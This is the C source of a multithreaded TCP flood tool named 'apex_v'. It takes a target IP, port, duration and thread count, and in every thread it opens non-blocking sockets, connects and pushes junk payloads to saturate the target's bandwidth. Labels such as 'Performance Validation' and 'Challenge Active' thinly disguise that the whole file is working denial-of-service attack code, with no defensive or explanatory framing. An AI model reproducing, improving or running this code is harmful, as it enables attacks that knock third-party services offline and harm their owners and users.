#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>

// Optimized for standard 1500-byte MTU minus headers
#define PAYLOAD_SIZE 1440 

typedef struct {
    char target_ip[16];
    int port;
    int duration;
} AttackArgs;

void *volumetric_load(void *args) {
    AttackArgs *a = (AttackArgs *)args;
    char payload[PAYLOAD_SIZE];
    memset(payload, 'A', PAYLOAD_SIZE); // Maximum volumetric weight

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(a->port);
    inet_pton(AF_INET, a->target_ip, &target_addr.sin_addr);

    time_t end_time = time(NULL) + a->duration;

    while (time(NULL) < end_time) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;

        // Bypasses the handshake wait state for maximum PPS
        fcntl(s, F_SETFL, O_NONBLOCK);

        // Initiate connection (Sends the SYN packet)
        connect(s, (struct sockaddr *)&target_addr, sizeof(target_addr));

        // Immediately push volumetric data to saturate the pipe
        send(s, payload, PAYLOAD_SIZE, MSG_DONTWAIT);

        // Rapid recycle of file descriptors to prevent 'Bad file descriptor'
        close(s);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("\nUsage: ./apex_v <IP> <PORT> <TIME> <THREADS>\n");
        return 1;
    }

    AttackArgs args;
    strncpy(args.target_ip, argv[1], 16);
    args.port = atoi(argv[2]);
    args.duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    pthread_t threads[thread_count];
    printf("[!] Challenge Active: Saturation Target 5000+ Mbps\n");
    printf("[!] Deploying %d High-Velocity Threads...\n", thread_count);

    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, volumetric_load, &args);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("[!] Performance Validation Complete.\n");
    return 0;
}
